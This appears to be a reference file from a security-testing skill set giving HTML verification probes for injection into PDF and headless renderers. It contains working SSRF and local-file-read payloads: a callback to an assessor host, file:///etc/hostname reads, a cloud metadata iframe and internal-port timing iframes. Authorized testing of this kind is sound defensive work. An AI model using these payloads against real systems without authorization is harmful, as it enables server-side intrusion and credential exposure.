# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`pdf-and-headless-renderer-injection`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `pdf-and-headless-renderer-injection`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### External baseline and engine fingerprint

**Expected differential:** a callback arrives carrying the renderer's engine User-Agent, proving server-side fetch rather than a browser request

```text
<img src="https://<assessor-controlled-host>/pdf-baseline.png">
```

### Local file read

**Expected differential:** an inert local file's bytes embed in the output only when local-file access is not disabled

```text
<img src="file:///etc/hostname">
<link rel="attachment" href="file:///etc/hostname">
```

### Cloud metadata reference

**Expected differential:** the metadata endpoint banner or a server-originated callback appears from the renderer host, absent for the external baseline

```text
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```

### Blind timing oracle

**Expected differential:** render time rises for an iframe to a reachable internal port versus a closed one, with no output returned

```text
<iframe src="http://127.0.0.1:80/"></iframe>
<iframe src="http://127.0.0.1:1/"></iframe>
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
